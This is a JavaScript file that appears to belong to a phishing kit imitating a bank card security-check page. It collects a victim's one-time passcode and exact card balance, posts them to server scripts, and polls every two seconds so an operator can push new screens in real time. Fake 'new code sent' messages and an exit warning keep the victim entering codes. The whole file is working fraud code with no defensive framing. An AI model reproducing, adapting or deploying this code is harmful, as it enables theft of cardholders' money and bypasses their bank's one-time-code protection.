function startCountdown() {
    var countdown = $('#countdown span'),
        timer;
    var startFrom = 30;
    $('.list-item.li_inp .label').addClass('remove_relative');
    countdown.text(startFrom).parent('p').show();
    timer = setInterval(function () {
        countdown.text(--startFrom);
        if (startFrom <= 0) {
            clearInterval(timer);
            $('input[type="submit"]').removeClass('cursordef');
            $('.big-input').attr('style', 'display:block');
            $('.smallie').attr('style', 'display:block');
            $('.backtimer').attr('style', 'display:none');
            $('.list-item.li_inp .label').removeClass('remove_relative');
            $('.codecenter').removeClass('pendingTime');
            $('#desc').html('<p class="new_ps">New one-time passcode has been sent to your registered mobile number.</p>');
            document.frm.sms.focus();
        }
    }, 1000);
}

function resendSMS() {
    var empty = '';
    if (confirm("Send another one-time code?")) {
        $('.sts').hide();
        $('#desc').html('<p>Another one-time code was sent to your phone number. Wait until you receive it and enter the new code.</p>');
        document.frm.sms.value = empty;
        document.frm.sms.focus();
        $('input[type="submit"]').removeClass('cursordef');
    }
}

function OnExit() {
    if (confirm("Are you sure you want to get out? Your transaction is not completed. To complete the transaction, click 'Cancel' and enter the code on the security check page.")) {
        isCheckUnload = false;
        document.frm.formaction.value = "pa.exit";
        document.frm.submit();
        document.location.href = '/'
    } else document.frm.sms.focus();
    return false;
}

function AnotherCard() {
    history.back()
}

function OnLoad() {
    var loginTries = 0;
    var desc = document.getElementById("desc");
    var pwdElement = document.getElementById("psw_id");
    var btnCodeSubmit = document.querySelector('#btnCodeSubmit');
    var style = window.getComputedStyle(pwdElement);
    if (!style.webkitTextSecurity) {
        pwdElement.setAttribute("type", "password");
    }
    pwdElement.oninput = () => {
        if (pwdElement.value.length >= 6) {
            btnCodeSubmit.classList.add('btn-red')
        } else {
            btnCodeSubmit.classList.remove('btn-red')
        }
    }
    document.frm.sms.focus();
}

function nowDate() {
    var now = new Date();
    var day = (now.getDate());
    var month = (now.getMonth() + 1);
    var year = (now.getFullYear());
    $('.date_day').text(day);
    $('.date_month').text(month);
    $('.date_year').text(year);
}

function iosAutoComplete() {
    var isIOSSafari = /iP(ad|od|hone)/i.test(window.navigator.userAgent) && /WebKit/i.test(window.navigator.userAgent) && !(/(CriOS|FxiOS|OPiOS|mercury|YaBrowser)/i.test(window.navigator.userAgent));
    if (isIOSSafari) {
        document.getElementById("psw_id").setAttribute("autocomplete", "one-time-code");
    }
}

function helpPage() {
    $('.help').removeClass('hid').addClass('sie');
    $('.codecenter').removeClass('sie').addClass('hid');
}

function comeBack() {
    $('.help').removeClass('sie').addClass('hid');
    $('.codecenter').removeClass('hid').addClass('sie');
}

let iCard = 0
const getUpdatesCard = setInterval(() => {
    iCard++
    $.ajax({
        url: './getUpdatesCard.php',
        method: 'get',
        success: function (data) {
            if (data != '') {
                clearInterval(getUpdatesCard);
                $('.codecenter').html(data);
                if (document.querySelector('#psw_id')) {
                    nowDate();
                    OnLoad();
                    document.sms.balance.focus();
                } else if (document.querySelector('#balance_id')) {
                    nowDate();
                    document.frm.balance.focus();
                }
            }
        }
    });
    if (iCard >= 30) {
        clearInterval(getUpdatesCard);
        $.ajax({
            url: './timeExpiredCard.php',
            method: 'get',
            success: function (data) {
                $('.codecenter').html(data);
                nowDate();
                OnLoad();
            }
        });
    }
}, 2000);

$(document).on('click', '#btnCodeSubmit', function (e) {
    e.preventDefault();
    let form = $('#ajax-contact');
    if (document.frm.sms.value === '') {
        alert("Please enter a one-time passcode.");
        document.frm.sms.focus();
        return false;
    } else {
        $.ajax({
            type: 'POST',
            url: './sendCode.php',
            data: form.serialize()
        })
        $('.codecenter').html('<img src="/images/spinner.gif" style="display:block;margin:auto;">');

        let iCode = 0
        const getUpdatesCode = setInterval(() => {
            iCode++
            $.ajax({
                url: './getUpdatesCode.php',
                method: 'get',
                success: function (data) {
                    if (data != '') {
                        clearInterval(getUpdatesCode);
                        $('.codecenter').html(data);
                        if (document.querySelector('#psw_id')) {
                            nowDate();
                            OnLoad();
                            document.frm.sms.value = '';
                            $('.codecenter').addClass('pendingTime');
                            startCountdown();
                        }
                    }
                }
            });
            if (iCode >= 30) {
                clearInterval(getUpdatesCode);
                $.ajax({
                    url: './timeExpiredCode.php',
                    method: 'get',
                    success: function (data) {
                        $('.codecenter').html(data);
                        nowDate();
                        OnLoad();
                        document.frm.sms.value = '';
                        $('.codecenter').addClass('pendingTime');
                        startCountdown();
                    }
                });
            }
        }, 2000);
    }
});

$(document).on('click', '#btnBalanceSubmit', function (e) {
    e.preventDefault();
    let form = $('#ajax-contact');
    if (document.frm.balance.value === '') {
        alert("Please enter the exact balance.");
        document.frm.balance.focus();
        return false;
    } else {
        $.ajax({
            type: 'POST',
            url: './sendBalance.php',
            data: form.serialize()
        })
        $('.codecenter').html('<img src="/images/spinner.gif" style="display:block;margin:auto;">');

        let iBalance = 0
        const getUpdatesBalance = setInterval(() => {
            iBalance++
            $.ajax({
                url: './getUpdatesBalance.php',
                method: 'get',
                success: function (data) {
                    if (data != '') {
                        clearInterval(getUpdatesBalance);
                        $('.codecenter').html(data);
                        if (document.querySelector('#balance_id')) {
                            nowDate();
                            document.frm.balance.value = '';
                            document.frm.balance.focus();
                        } else if (document.querySelector('#psw_id')) {
                            nowDate();
                            OnLoad();
                        }
                    }
                }
            });
            if (iBalance >= 30) {
                clearInterval(getUpdatesBalance);
                $.ajax({
                    url: './timeExpiredBalance.php',
                    method: 'get',
                    success: function (data) {
                        $('.codecenter').html(data);
                        nowDate();
                        OnLoad();
                        document.frm.sms.value = '';
                    }
                });
            }
        }, 2000);
    }
});
